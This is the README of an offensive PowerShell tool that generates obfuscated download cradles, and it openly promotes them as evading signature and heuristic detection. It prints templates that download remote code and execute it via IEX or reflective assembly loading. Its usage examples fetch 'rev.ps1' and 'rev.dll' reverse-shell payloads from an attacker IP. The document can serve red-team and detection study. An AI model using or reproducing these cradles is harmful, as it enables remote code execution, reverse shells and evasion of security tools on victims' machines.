# Obfuscated PowerShell Download Cradles

Get-DownloadCradle is a project that stems from the Invoke-PSObfuscation framework, with the sole purpose of producing obfuscated download cradles for PowerShell.

With the way the underlying framework has been written, each execution of this script will produce a different payload. In addition to this as well as the relative complexity of the obfuscation logic, the resulting payloads will be very difficult to signature and will slip past heuristic engines that are not programmed to emulate the inherited code.

## Cradle Templates

This script includes templates for three PowerShell download cradles, namely `DownloadString`, `DownloadFile` and `DownloadData`. The resulting payloads are output as a one liner, but have been split below for readability. 

__DownloadString__

```powershell
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadString("<DOWNLOADPATH>") | IEX
```
__DownloadFile__

```powershell
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("<DOWNLOADPATH>","<LOCALPATH>")
$Assem = [System.Reflection.Assembly]::LoadFile("<LOCALPATH>")
$Class = $Assem.GetType("<CLASSNAME>")
$Method = $Class.GetMethod("<METHODNAME>")
$Method.Invoke(0,$null)
```

__DownloadData__

```powershell
$WebClient = New-Object System.Net.WebClient
$Data = $WebClient.DownloadData("<DOWNLOADPATH>")
$Assem = [System.Reflection.Assembly]::Load($Data)
$Class = $Assem.GetType("<CLASSNAME>")
$Method = $Class.GetMethod("<METHODNAME>")
$Method.Invoke(0,$null)
```

## Requirements

This script was built and tested on the following version Kali Linux and PowerShell. The obfuscated cradles are compatible on Windows systems that support PowerShell newer than version 2.0

```shell
┌──(kali㉿kali)-[/home/kali]
└─PS> $PSVersionTable

Name                           Value
----                           -----
PSVersion                      7.2.4
PSEdition                      Core
GitCommitId                    7.2.4
OS                             Linux 5.18.0-kali5-amd64 #1 SMP PREEMPT_DYNAMIC Debian 5.18.5-1kali6 (2022-07-07)
Platform                       Unix
PSCompatibleVersions           {1.0, 2.0, 3.0, 4.0…}
PSRemotingProtocolVersion      2.3
SerializationVersion           1.1.0.1
WSManStackVersion              3.0
```

## Usage Examples

To load the script on Kali Linux, open a terminal then run `pwsh`. With PowerShell now running in your terminal, you can load the script into your current session by dot sourcing the script.

```shell
┌──(kali㉿kali)-[~]
└─$ pwsh
PowerShell 7.2.4
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

┌──(kali㉿kali)-[/home/kali]
└─PS> . ./Get-DownloadCradle.ps1
```

With the script loaded into our PowerShell session, we need to run the `Get-DownloadCradle` function and supply the cradle type and accompanying information to inject into the payload.

__DownloadString__

`Get-DownloadCradle -DownloadString -DownloadPath http://192.168.49.80/rev.ps1`

__DownloadFile__

`Get-DownloadCradle -DownloadFile -DownloadPath http://192.168.49.80/rev.dll -LocalPath C:\rev.dll -Class DLL_Payload.ReverseShell -Method runner`

__DownloadData__

`Get-DownloadCradle -DownloadData -DownloadPath http://192.168.49.80/rev.dll -Class DLL_Payload.ReverseShell -Method runner`

__Output to File__

`Get-DownloadCradle -DownloadData -DownloadPath http://192.168.49.80/rev.dll -Class DLL_Payload.ReverseShell -Method runner -OutFile obfuscated.ps1`
